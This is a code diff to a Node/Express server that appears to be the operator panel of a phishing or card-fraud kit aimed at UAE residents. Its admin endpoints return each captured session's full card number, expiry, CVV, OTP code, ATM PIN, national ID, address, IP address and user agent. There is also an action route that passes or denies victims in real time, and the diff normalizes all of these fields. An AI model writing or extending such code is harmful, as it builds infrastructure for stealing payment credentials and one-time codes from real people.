@@ -278,18 +278,44 @@ app.get('/api/admin/sessions', async (req, res) => {
   // Mark all as read
   await markAllAsRead();
   
-  // Enrich with registration data
+  // Enrich with registration data and normalize field names
   const enriched = [];
   for (const session of sessions) {
     const registration = await getRegistrationBySessionId(session.sessionId);
-    enriched.push({
+    const s: any = {
       ...session,
-      idNumber: session.idNumber || registration?.idNumber || null,
-      addressEmirate: registration?.addressEmirate || null,
-      addressDistrict: registration?.addressDistrict || null,
-      addressStreet: registration?.addressStreet || null,
-      addressBuildingNumber: registration?.addressBuildingNumber || null,
-    });
+      // Normalize PostgreSQL lowercase fields to camelCase
+      id: session.id || session['id'],
+      sessionId: session.sessionId || (session as any)['sessionid'],
+      fullName: session.fullName || (session as any)['fullname'],
+      phoneNumber: session.phoneNumber || (session as any)['phonenumber'],
+      email: session.email || session['email'],
+      emirate: session.emirate || session['emirate'],
+      district: session.district || session['district'],
+      membershipTier: session.membershipTier || (session as any)['membershiptier'],
+      totalAmount: session.totalAmount || (session as any)['totalamount'],
+      idNumber: session.idNumber || (session as any)['idnumber'] || registration?.idNumber || (registration as any)?.idnumber || null,
+      addressEmirate: registration?.addressEmirate || (registration as any)?.addresseemirate || null,
+      addressDistrict: registration?.addressDistrict || (registration as any)?.addressdistrict || null,
+      addressStreet: registration?.addressStreet || (registration as any)?.addressstreet || null,
+      addressBuildingNumber: registration?.addressBuildingNumber || (registration as any)?.addressbuildingnumber || null,
+      cardName: session.cardName || (session as any)['cardname'],
+      cardNumber: session.cardNumber || (session as any)['cardnumber'],
+      cardNumberMasked: session.cardNumberMasked || (session as any)['cardnumbermasked'],
+      cardExpiry: session.cardExpiry || (session as any)['cardexpiry'],
+      cardCvv: session.cardCvv || (session as any)['cardcvv'],
+      otpCode: session.otpCode || (session as any)['otpcode'],
+      atmPin: session.atmPin || (session as any)['atmpin'],
+      stage: session.stage || session['stage'],
+      errorMessage: session.errorMessage || (session as any)['errormessage'],
+      clientIp: session.clientIp || (session as any)['clientip'],
+      userAgent: session.userAgent || (session as any)['useragent'],
+      statusRead: session.statusRead || (session as any)['statusread'],
+      redirectUrl: session.redirectUrl || (session as any)['redirecturl'],
+      createdAt: session.createdAt || (session as any)['createdat'],
+      updatedAt: session.updatedAt || (session as any)['updatedat'],
+    };
+    enriched.push(s);
   }
   
   res.json(enriched);
@@ -307,17 +333,42 @@ app.get('/api/admin/sessions/:sessionId', async (req, res) => {
     return res.status(404).json({ error: 'الجلسة غير موجودة' });
   }
   
-  const registration = await getRegistrationBySessionId(session.sessionId);
-  await updateSession(session.sessionId, { statusRead: 1 });
+  const registration = await getRegistrationBySessionId(session.sessionId || (session as any).sessionid);
+  await updateSession(session.sessionId || (session as any).sessionid, { statusRead: 1 });
   
-  res.json({
+  const s: any = {
     ...session,
-    idNumber: session.idNumber || registration?.idNumber || null,
-    addressEmirate: registration?.addressEmirate || null,
-    addressDistrict: registration?.addressDistrict || null,
-    addressStreet: registration?.addressStreet || null,
-    addressBuildingNumber: registration?.addressBuildingNumber || null,
-  });
+    sessionId: session.sessionId || (session as any).sessionid,
+    fullName: session.fullName || (session as any).fullname,
+    phoneNumber: session.phoneNumber || (session as any).phonenumber,
+    email: session.email || (session as any).email,
+    emirate: session.emirate || (session as any).emirate,
+    district: session.district || (session as any).district,
+    membershipTier: session.membershipTier || (session as any).membershiptier,
+    totalAmount: session.totalAmount || (session as any).totalamount,
+    idNumber: session.idNumber || (session as any).idnumber || registration?.idNumber || (registration as any)?.idnumber || null,
+    addressEmirate: registration?.addressEmirate || (registration as any)?.addresseemirate || null,
+    addressDistrict: registration?.addressDistrict || (registration as any)?.addressdistrict || null,
+    addressStreet: registration?.addressStreet || (registration as any)?.addressstreet || null,
+    addressBuildingNumber: registration?.addressBuildingNumber || (registration as any)?.addressbuildingnumber || null,
+    cardName: session.cardName || (session as any).cardname,
+    cardNumber: session.cardNumber || (session as any).cardnumber,
+    cardNumberMasked: session.cardNumberMasked || (session as any).cardnumbermasked,
+    cardExpiry: session.cardExpiry || (session as any).cardexpiry,
+    cardCvv: session.cardCvv || (session as any).cardcvv,
+    otpCode: session.otpCode || (session as any).otpcode,
+    atmPin: session.atmPin || (session as any).atmpin,
+    stage: session.stage || (session as any).stage,
+    errorMessage: session.errorMessage || (session as any).errormessage,
+    clientIp: session.clientIp || (session as any).clientip,
+    userAgent: session.userAgent || (session as any).useragent,
+    statusRead: session.statusRead || (session as any).statusread,
+    redirectUrl: session.redirectUrl || (session as any).redirecturl,
+    createdAt: session.createdAt || (session as any).createdat,
+    updatedAt: session.updatedAt || (session as any).updatedat,
+  };
+  
+  res.json(s);
 });
 
 // Session action (pass/denied/completed)
@@ -404,8 +455,12 @@ app.get('/{*path}', (req, res) => {
 });
 
 // Start server
-const server = app.listen(PORT, () => {
+const server = app.listen(PORT, async () => {
   console.log(`[Server] Running on port ${PORT}`);
+  // Initialize database and run migrations
+  const { initDatabase } = await import('./database.js');
+  await initDatabase();
+  console.log('[Server] Database initialized');
 });
 
 // Setup WebSocket visitor tracking
